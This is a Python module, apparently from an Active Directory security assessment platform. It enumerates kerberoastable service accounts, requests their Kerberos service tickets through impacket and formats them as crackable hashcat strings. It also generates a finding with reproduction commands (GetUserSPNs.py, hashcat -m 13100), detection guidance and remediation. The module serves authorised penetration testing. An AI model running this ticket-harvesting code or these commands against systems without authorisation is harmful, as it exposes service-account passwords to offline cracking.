"""
KerberoastChecker — find SPN-bearing accounts and capture TGS hashes as
*offline-cracking evidence only*.

Kerberoasting (MITRE T1558.003) abuses the fact that any authenticated user can
request a service ticket (TGS) for any account with a Service Principal Name;
the ticket is encrypted with the service account's NTLM hash and can be cracked
offline. This module **captures the hash as evidence and stops there** — it
never attempts to crack it.

impacket is an optional dependency. Without it, ``get_spn_accounts`` still works
(it only needs the existing LDAP connection), but ``request_tgs`` returns None
and notes the missing dependency.
"""
from __future__ import annotations

from datetime import datetime
from typing import Any

import structlog

from app.ad.findings import build_ad_finding
from app.ad.ldap_enum import LDAPEnumerator
from app.models.enums import FindingSeverity

logger = structlog.get_logger()

try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP
    from impacket.krb5.ccache import CCache  # noqa: F401  (kept for parity)
    from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
    from impacket.krb5.types import KerberosTime, Principal

    _HAS_IMPACKET = True
except ImportError:  # pragma: no cover
    _HAS_IMPACKET = False


class KerberoastChecker:
    """Enumerate kerberoastable accounts and capture TGS evidence."""

    MITRE = ["T1558.003"]
    CWE = "CWE-522"  # Insufficiently Protected Credentials

    # ── get_spn_accounts ────────────────────────────────────────────────────────

    def get_spn_accounts(self, ldap_conn: LDAPEnumerator) -> list[dict[str, Any]]:
        """
        Returns user accounts that have a servicePrincipalName set (and are not
        computer accounts — those are not useful targets). The krbtgt account is
        excluded.
        """
        accounts: list[dict[str, Any]] = []
        for user in ldap_conn.get_users():
            if not user.spn:
                continue
            if user.samaccountname.lower() in ("krbtgt", ""):
                continue
            accounts.append({
                "username": user.samaccountname,
                "spn": user.spn,
                "password_last_set": self._pwd_last_set(ldap_conn, user.dn),
                "admin_count": user.admin_count,
                "enabled": user.enabled,
            })
        logger.info("ad.kerberoast.spn_accounts", count=len(accounts))
        return accounts

    @staticmethod
    def _pwd_last_set(ldap_conn: LDAPEnumerator, dn: str | None) -> str | None:
        if not dn or ldap_conn.connection is None:
            return None
        try:
            conn = ldap_conn.connection
            conn.search(dn, "(objectClass=*)", search_scope="BASE", attributes=["pwdLastSet"])
            if conn.entries:
                val = conn.entries[0]["pwdLastSet"].value
                return str(val) if val is not None else None
        except Exception:
            return None
        return None

    # ── request_tgs ───────────────────────────────────────────────────────────────

    def request_tgs(
        self,
        username: str,
        spn: str,
        dc_ip: str,
        domain: str,
        credentials: dict[str, str],
    ) -> str | None:
        """
        Request a TGS for ``spn`` and return the $krb5tgs$ hash string for offline
        cracking evidence. Does NOT crack the hash.

        ``credentials`` = {"username": ..., "password": ..., optional "nthash"}.
        Returns None if impacket is missing or the request fails.
        """
        if not _HAS_IMPACKET:
            logger.warning("ad.kerberoast.no_impacket", hint="pip install impacket")
            return None

        auth_user = credentials.get("username", "")
        password = credentials.get("password", "")
        lmhash = credentials.get("lmhash", "")
        nthash = credentials.get("nthash", "")

        try:
            user_principal = Principal(
                auth_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            tgt, cipher, _old_session_key, session_key = getKerberosTGT(
                user_principal, password, domain, lmhash, nthash, None, dc_ip
            )
            target_principal = Principal(
                spn, type=constants.PrincipalNameType.NT_SRV_INST.value
            )
            tgs, cipher, _osk, sk = getKerberosTGS(
                target_principal, domain, dc_ip, tgt, cipher, session_key
            )
            tgs_hash = self._encode_tgs_rep(username, domain, spn, tgs)
            logger.info("ad.kerberoast.tgs_captured", username=username, spn=spn)
            return tgs_hash
        except Exception as exc:
            logger.warning("ad.kerberoast.tgs_failed", username=username, spn=spn, error=str(exc))
            return None

    @staticmethod
    def _encode_tgs_rep(username: str, domain: str, spn: str, tgs: Any) -> str:
        """Render the TGS as a hashcat $krb5tgs$ string (etype 23/RC4 layout)."""
        from impacket.krb5.asn1 import TGS_REP as _TGS_REP
        from pyasn1.codec.der import decoder

        decoded = decoder.decode(tgs, asn1Spec=_TGS_REP())[0]
        etype = int(decoded["ticket"]["enc-part"]["etype"])
        cipher_bytes = bytes(decoded["ticket"]["enc-part"]["cipher"])
        checksum = cipher_bytes[:16].hex()
        edata = cipher_bytes[16:].hex()
        return f"$krb5tgs${etype}$*{username}${domain.upper()}${spn}*${checksum}${edata}"

    # ── generate_finding ──────────────────────────────────────────────────────────

    def generate_finding(self, spn_accounts: list[dict[str, Any]]) -> dict[str, Any] | None:
        """
        One aggregate Finding for all kerberoastable accounts.
        Severity is Critical when privileged (adminCount) accounts are exposed,
        otherwise High. Returns None when there are no SPN accounts.
        """
        if not spn_accounts:
            return None

        privileged = [a for a in spn_accounts if a.get("admin_count")]
        severity = FindingSeverity.critical if privileged else FindingSeverity.high
        names = ", ".join(a["username"] for a in spn_accounts[:10])

        return build_ad_finding(
            title=f"Kerberoastable service accounts exposed ({len(spn_accounts)})",
            severity=severity,
            description=(
                "One or more domain accounts have a Service Principal Name (SPN) "
                "registered. Any authenticated domain user can request a Kerberos "
                "service ticket (TGS) for these accounts and crack the ticket "
                "offline to recover the service account's plaintext password. "
                f"Affected accounts: {names}"
                + (f" — {len(privileged)} are privileged (adminCount=1)." if privileged else "")
            ),
            mitre_techniques=self.MITRE,
            cwe=self.CWE,
            reproduction=[
                "Authenticate to the domain as any standard user.",
                "Enumerate SPN accounts: GetUserSPNs.py 'DOMAIN/user:password' -dc-ip <DC>",
                "Request and save TGS hashes: GetUserSPNs.py ... -request -outputfile tgs.hash",
                "Crack offline (out of scope for this platform): hashcat -m 13100 tgs.hash wordlist",
            ],
            detection_opportunity=(
                "Monitor Kerberos Service Ticket Operations (Event ID 4769) with "
                "Ticket Encryption Type 0x17 (RC4) and a high volume of TGS requests "
                "for distinct SPNs from a single account."
            ),
            remediation=(
                "Use group Managed Service Accounts (gMSA) with 120+ character "
                "randomly-generated passwords, or set long (25+ char) passwords on "
                "service accounts. Enforce AES-only Kerberos encryption and remove "
                "unnecessary SPNs. Avoid placing service accounts in privileged groups."
            ),
            exploitable=True,
            evidence_extra={
                "spn_accounts": spn_accounts,
                "privileged_count": len(privileged),
                "note": "TGS hashes captured as evidence only — not cracked by this platform.",
            },
        )
